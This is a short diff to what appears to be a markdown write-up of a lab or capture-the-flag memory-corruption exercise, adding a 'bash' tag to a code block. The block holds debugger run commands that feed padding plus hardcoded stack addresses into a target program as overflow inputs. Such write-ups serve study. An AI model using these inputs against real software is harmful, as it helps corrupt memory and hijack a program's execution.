@@ -444,7 +444,7 @@ With 5 letters our value is 0xffffd577. With 20, we would have to decrease the l
 
 Here's some statments that worked for me:
 
-```
+```bash
 r `echo -e "hellohellohellohello\x64\xd5\xff\xff"`
 r `echo -e "hellohellohellohello\x60\xd5\xff\xffAAAA"`
 r `echo -e "hellohellohellohello\x5c\xd5\xff\xffAAAABBBB"`
